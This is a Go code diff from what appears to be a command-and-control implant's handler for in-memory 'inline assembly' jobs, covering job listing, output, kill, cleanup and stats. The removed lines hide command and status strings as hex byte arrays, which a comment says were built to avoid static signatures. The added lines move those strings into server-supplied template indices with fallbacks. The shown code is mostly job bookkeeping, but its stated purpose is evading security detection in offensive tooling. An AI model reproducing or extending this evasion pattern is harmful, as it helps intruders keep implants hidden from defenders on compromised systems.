@@ -12,43 +12,199 @@ import (
 	"time"
 )
 
-// Inline assembly job command strings (constructed to avoid static signatures)
-var (
+// InlineAssemblyJobs template indices (must match server's common.go)
+// Uses shared template from action_inline_assembly.go via iaTpl()
+const (
 	// Command names
-	iasCmdJobs      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73})                               // inline-assembly-jobs
-	iasCmdOutput    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                   // inline-assembly-output
-	iasCmdKill      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c})                               // inline-assembly-kill
-	iasCmdClean     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x63, 0x6c, 0x65, 0x61, 0x6e}) // inline-assembly-jobs-clean
-	iasCmdStats     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x73}) // inline-assembly-jobs-stats
+	idxIACmdJobs   = 421
+	idxIACmdOutput = 422
+	idxIACmdKill   = 423
+	idxIACmdClean  = 424
+	idxIACmdStats  = 425
 
 	// Status strings
-	iasStatusRunning   = string([]byte{0x72, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67})                         // running
-	iasStatusCompleted = string([]byte{0x63, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64})             // completed
-	iasStatusFailed    = string([]byte{0x66, 0x61, 0x69, 0x6c, 0x65, 0x64})                               // failed
-	iasStatusKilled    = string([]byte{0x6b, 0x69, 0x6c, 0x6c, 0x65, 0x64})                               // killed
-	iasStatusTimeout   = string([]byte{0x74, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74})                         // timeout
+	idxIAStatusRunning   = 426
+	idxIAStatusCompleted = 427
+	idxIAStatusFailed    = 428
+	idxIAStatusKilled    = 429
+	idxIAStatusTimeout   = 430
 
 	// Format components
-	iasFmtRunningPrefix  = string([]byte{0x72, 0x3a})             // r:
-	iasFmtDonePrefix     = string([]byte{0x64, 0x3a})             // d:
-	iasFmtDash           = string([]byte{0x2d})                   // -
-	iasFmtPipe           = string([]byte{0x7c})                   // |
-	iasFmtNewline        = string([]byte{0x0a})                   // \n
-	iasFmtEllipsis       = string([]byte{0x2e, 0x2e, 0x2e})       // ...
-	iasFmtColSep         = string([]byte{0x20, 0x7c, 0x20})       // " | "
-	iasFmtZero           = string([]byte{0x30})                   // 0
-	iasFmtOne            = string([]byte{0x31})                   // 1
-	iasFmtColon          = string([]byte{0x3a})                   // :
+	idxIAFmtRunningPrefix = 431
+	idxIAFmtDonePrefix    = 432
+	idxIAFmtDash          = 433
+	idxIAFmtPipe          = 434
+	idxIAFmtNewline       = 435
+	idxIAFmtEllipsis      = 436
+	idxIAFmtColSep        = 437
+	idxIAFmtZero          = 438
+	idxIAFmtOne           = 439
+	idxIAFmtColon         = 440
 
 	// Stats labels
-	iasStatsHeader    = string([]byte{0x53, 0x74, 0x61, 0x74, 0x73, 0x3a, 0x0a})                                                                 // Stats:\n
-	iasStatsTotalLbl  = string([]byte{0x54, 0x6f, 0x74, 0x61, 0x6c, 0x20, 0x4a, 0x6f, 0x62, 0x73, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20})           // Total Jobs:
-	iasStatsRunLbl    = string([]byte{0x52, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Running:
-	iasStatsCompLbl   = string([]byte{0x43, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Completed:
-	iasStatsFailLbl   = string([]byte{0x46, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Failed:
-	iasStatsKillLbl   = string([]byte{0x4b, 0x69, 0x6c, 0x6c, 0x65, 0x64, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Killed:
-	iasStatsTimeLbl   = string([]byte{0x54, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Timeout:
+	idxIAStatsHeader   = 442
+	idxIAStatsTotalLbl = 443
+	idxIAStatsRunLbl   = 444
+	idxIAStatsCompLbl  = 445
+	idxIAStatsFailLbl  = 446
+	idxIAStatsKillLbl  = 447
+	idxIAStatsTimeLbl  = 448
 )
+
+// Convenience functions for job command strings with fallbacks
+func iasStatusRunning() string {
+	if s := iaTpl(idxIAStatusRunning); s != "" {
+		return s
+	}
+	return "running"
+}
+
+func iasStatusCompleted() string {
+	if s := iaTpl(idxIAStatusCompleted); s != "" {
+		return s
+	}
+	return "completed"
+}
+
+func iasStatusFailed() string {
+	if s := iaTpl(idxIAStatusFailed); s != "" {
+		return s
+	}
+	return "failed"
+}
+
+func iasStatusKilled() string {
+	if s := iaTpl(idxIAStatusKilled); s != "" {
+		return s
+	}
+	return "killed"
+}
+
+func iasStatusTimeout() string {
+	if s := iaTpl(idxIAStatusTimeout); s != "" {
+		return s
+	}
+	return "timeout"
+}
+
+func iasFmtRunningPrefix() string {
+	if s := iaTpl(idxIAFmtRunningPrefix); s != "" {
+		return s
+	}
+	return "r:"
+}
+
+func iasFmtDonePrefix() string {
+	if s := iaTpl(idxIAFmtDonePrefix); s != "" {
+		return s
+	}
+	return "d:"
+}
+
+func iasFmtDash() string {
+	if s := iaTpl(idxIAFmtDash); s != "" {
+		return s
+	}
+	return "-"
+}
+
+func iasFmtPipe() string {
+	if s := iaTpl(idxIAFmtPipe); s != "" {
+		return s
+	}
+	return "|"
+}
+
+func iasFmtNewline() string {
+	if s := iaTpl(idxIAFmtNewline); s != "" {
+		return s
+	}
+	return "\n"
+}
+
+func iasFmtEllipsis() string {
+	if s := iaTpl(idxIAFmtEllipsis); s != "" {
+		return s
+	}
+	return "..."
+}
+
+func iasFmtColSep() string {
+	if s := iaTpl(idxIAFmtColSep); s != "" {
+		return s
+	}
+	return " | "
+}
+
+func iasFmtZero() string {
+	if s := iaTpl(idxIAFmtZero); s != "" {
+		return s
+	}
+	return "0"
+}
+
+func iasFmtOne() string {
+	if s := iaTpl(idxIAFmtOne); s != "" {
+		return s
+	}
+	return "1"
+}
+
+func iasFmtColon() string {
+	if s := iaTpl(idxIAFmtColon); s != "" {
+		return s
+	}
+	return ":"
+}
+
+func iasStatsHeader() string {
+	if s := iaTpl(idxIAStatsHeader); s != "" {
+		return s
+	}
+	return "Stats:\n"
+}
+
+func iasStatsTotalLbl() string {
+	if s := iaTpl(idxIAStatsTotalLbl); s != "" {
+		return s
+	}
+	return "Total Jobs:     "
+}
+
+func iasStatsRunLbl() string {
+	if s := iaTpl(idxIAStatsRunLbl); s != "" {
+		return s
+	}
+	return "Running:        "
+}
+
+func iasStatsCompLbl() string {
+	if s := iaTpl(idxIAStatsCompLbl); s != "" {
+		return s
+	}
+	return "Completed:      "
+}
+
+func iasStatsFailLbl() string {
+	if s := iaTpl(idxIAStatsFailLbl); s != "" {
+		return s
+	}
+	return "Failed:         "
+}
+
+func iasStatsKillLbl() string {
+	if s := iaTpl(idxIAStatsKillLbl); s != "" {
+		return s
+	}
+	return "Killed:         "
+}
+
+func iasStatsTimeLbl() string {
+	if s := iaTpl(idxIAStatsTimeLbl); s != "" {
+		return s
+	}
+	return "Timeout:        "
+}
 
 // AssemblyJob represents an async assembly execution job
 type AssemblyJob struct {
@@ -136,23 +292,23 @@ func (c *InlineAssemblyOutputCommand) Execute(ctx *CommandContext, args []string
 	// Format: job_id|status|truncated(0/1)|duration_or_running|buffer_bytes|output
 	var result strings.Builder
 
-	truncatedFlag := iasFmtZero
+	truncatedFlag := iasFmtZero()
 	if truncated {
-		truncatedFlag = iasFmtOne
+		truncatedFlag = iasFmtOne()
 	}
 
 	var durationStr string
-	if status == iasStatusRunning {
+	if status == iasStatusRunning() {
 		duration := time.Since(job.StartTime).Round(time.Second)
-		durationStr = iasFmtRunningPrefix + duration.String() + iasFmtColon + fmt.Sprintf("%d", bufferSize)
+		durationStr = iasFmtRunningPrefix() + duration.String() + iasFmtColon() + fmt.Sprintf("%d", bufferSize)
 	} else if job.EndTime != nil {
 		duration := job.EndTime.Sub(job.StartTime).Round(time.Second)
-		durationStr = iasFmtDonePrefix + duration.String()
+		durationStr = iasFmtDonePrefix() + duration.String()
 	} else {
-		durationStr = iasFmtDash
+		durationStr = iasFmtDash()
 	}
 
-	result.WriteString(job.ID + iasFmtPipe + status + iasFmtPipe + truncatedFlag + iasFmtPipe + durationStr + iasFmtNewline)
+	result.WriteString(job.ID + iasFmtPipe() + status + iasFmtPipe() + truncatedFlag + iasFmtPipe() + durationStr + iasFmtNewline())
 
 	// Add the actual output
 	if output == "" {
@@ -210,13 +366,13 @@ func executeAssemblyJobsList() CommandResult {
 		// Truncate name if too long
 		name := job.Name
 		if len(name) > 19 {
-			name = name[:16] + iasFmtEllipsis
+			name = name[:16] + iasFmtEllipsis()
 		}
 
-		output.WriteString(fmt.Sprintf("%-24s", job.ID[:min(24, len(job.ID))]) + iasFmtColSep +
-			fmt.Sprintf("%-19s", name) + iasFmtColSep +
-			fmt.Sprintf("%-11s", job.Status) + iasFmtColSep +
-			fmt.Sprintf("%-16s", durationStr) + iasFmtNewline)
+		output.WriteString(fmt.Sprintf("%-24s", job.ID[:min(24, len(job.ID))]) + iasFmtColSep() +
+			fmt.Sprintf("%-19s", name) + iasFmtColSep() +
+			fmt.Sprintf("%-11s", job.Status) + iasFmtColSep() +
+			fmt.Sprintf("%-16s", durationStr) + iasFmtNewline())
 		job.OutputMutex.Unlock()
 	}
 
@@ -255,16 +411,16 @@ func executeAssemblyGetOutput(jobID string) CommandResult {
 
 	// Compact output format - client expands
 	// Format: status_code|job_id|truncated(0/1)|output
-	truncatedFlag := iasFmtZero
+	truncatedFlag := iasFmtZero()
 	if truncated {
-		truncatedFlag = iasFmtOne
+		truncatedFlag = iasFmtOne()
 	}
 
 	if output == "" {
 		// S18 = no output yet
-		output = Succ(S18) + iasFmtPipe + job.ID + iasFmtPipe + status + iasFmtPipe + truncatedFlag + iasFmtPipe
+		output = Succ(S18) + iasFmtPipe() + job.ID + iasFmtPipe() + status + iasFmtPipe() + truncatedFlag + iasFmtPipe()
 	} else {
-		output = Succ(S5) + iasFmtPipe + job.ID + iasFmtPipe + status + iasFmtPipe + truncatedFlag + iasFmtNewline + output
+		output = Succ(S5) + iasFmtPipe() + job.ID + iasFmtPipe() + status + iasFmtPipe() + truncatedFlag + iasFmtNewline() + output
 	}
 
 	return CommandResult{
@@ -295,7 +451,7 @@ func executeAssemblyKillJob(jobID string) CommandResult {
 		}
 	}
 
-	if job.Status != iasStatusRunning {
+	if job.Status != iasStatusRunning() {
 		return CommandResult{
 			Output:   ErrCtx(E27, job.ID),
 			ExitCode: 1,
@@ -309,7 +465,7 @@ func executeAssemblyKillJob(jobID string) CommandResult {
 
 		// Mark as killed
 		assemblyJobManager.mu.Lock()
-		job.Status = iasStatusKilled
+		job.Status = iasStatusKilled()
 		endTime := time.Now()
 		job.EndTime = &endTime
 		assemblyJobManager.mu.Unlock()
@@ -363,7 +519,7 @@ func (ajm *AssemblyJobManager) CleanupOldJobs(maxAge time.Duration) {
 
 	now := time.Now()
 	for id, job := range ajm.jobs {
-		if job.Status != iasStatusRunning && job.EndTime != nil {
+		if job.Status != iasStatusRunning() && job.EndTime != nil {
 			if now.Sub(*job.EndTime) > maxAge {
 				delete(ajm.jobs, id)
 			}
@@ -378,7 +534,7 @@ func (ajm *AssemblyJobManager) CleanupCompletedJobs() int {
 
 	cleaned := 0
 	for id, job := range ajm.jobs {
-		if job.Status != iasStatusRunning {
+		if job.Status != iasStatusRunning() {
 			delete(ajm.jobs, id)
 			cleaned++
 		}
@@ -435,7 +591,7 @@ func executeAssemblyJobsCleanSpecific(jobID string) CommandResult {
 		}
 	}
 
-	if job.Status == iasStatusRunning {
+	if job.Status == iasStatusRunning() {
 		return CommandResult{
 			Output:   ErrCtx(E27, job.ID),
 			ExitCode: 1,
@@ -480,27 +636,27 @@ func executeAssemblyJobsStats() CommandResult {
 
 	for _, job := range jobs {
 		switch job.Status {
-		case iasStatusRunning:
+		case iasStatusRunning():
 			stats.Running++
-		case iasStatusCompleted:
+		case iasStatusCompleted():
 			stats.Completed++
-		case iasStatusFailed:
+		case iasStatusFailed():
 			stats.Failed++
-		case iasStatusKilled:
+		case iasStatusKilled():
 			stats.Killed++
-		case iasStatusTimeout:
+		case iasStatusTimeout():
 			stats.Timeout++
 		}
 	}
 
 	var output strings.Builder
-	output.WriteString(iasStatsHeader)
-	output.WriteString(iasStatsTotalLbl + fmt.Sprintf("%d", stats.Total) + iasFmtNewline)
-	output.WriteString(iasStatsRunLbl + fmt.Sprintf("%d", stats.Running) + iasFmtNewline)
-	output.WriteString(iasStatsCompLbl + fmt.Sprintf("%d", stats.Completed) + iasFmtNewline)
-	output.WriteString(iasStatsFailLbl + fmt.Sprintf("%d", stats.Failed) + iasFmtNewline)
-	output.WriteString(iasStatsKillLbl + fmt.Sprintf("%d", stats.Killed) + iasFmtNewline)
-	output.WriteString(iasStatsTimeLbl + fmt.Sprintf("%d", stats.Timeout) + iasFmtNewline)
+	output.WriteString(iasStatsHeader())
+	output.WriteString(iasStatsTotalLbl() + fmt.Sprintf("%d", stats.Total) + iasFmtNewline())
+	output.WriteString(iasStatsRunLbl() + fmt.Sprintf("%d", stats.Running) + iasFmtNewline())
+	output.WriteString(iasStatsCompLbl() + fmt.Sprintf("%d", stats.Completed) + iasFmtNewline())
+	output.WriteString(iasStatsFailLbl() + fmt.Sprintf("%d", stats.Failed) + iasFmtNewline())
+	output.WriteString(iasStatsKillLbl() + fmt.Sprintf("%d", stats.Killed) + iasFmtNewline())
+	output.WriteString(iasStatsTimeLbl() + fmt.Sprintf("%d", stats.Timeout) + iasFmtNewline())
 
 	return CommandResult{
 		Output:   output.String(),
